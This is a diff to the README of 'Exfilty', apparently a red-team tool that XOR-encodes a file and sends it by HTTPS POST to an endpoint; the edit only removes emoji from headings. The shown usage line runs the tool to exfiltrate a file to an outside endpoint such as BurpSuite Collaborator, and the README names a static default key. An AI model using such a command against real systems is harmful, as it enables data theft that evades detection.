@@ -6,7 +6,7 @@ The tool performs HTTPS POST-based file transfer to a specified endpoint, applyi
 
 ---
 
-## 📦 Features
+## Features
 
 - Minimal and portable Windows executable
 - XOR-based payload encoding (configurable key)
@@ -16,7 +16,7 @@ The tool performs HTTPS POST-based file transfer to a specified endpoint, applyi
 
 ---
 
-## 🔧 Usage
+## Usage
 ```bash
 exfilty.exe https://your_endpoint> <file_to_exfiltrate>  # BurpSuite Collaborator recommended
 ```
@@ -25,7 +25,7 @@ The tool will read the file, apply XOR encryption using a predefined key, and se
 
 ---
 
-## 🔑 Encryption Logic
+## Encryption Logic
 
 Exfilty uses a symmetric XOR cipher with a static key (`secreta123` by default). This key must match on both ends of communication (sender and receiver).
 
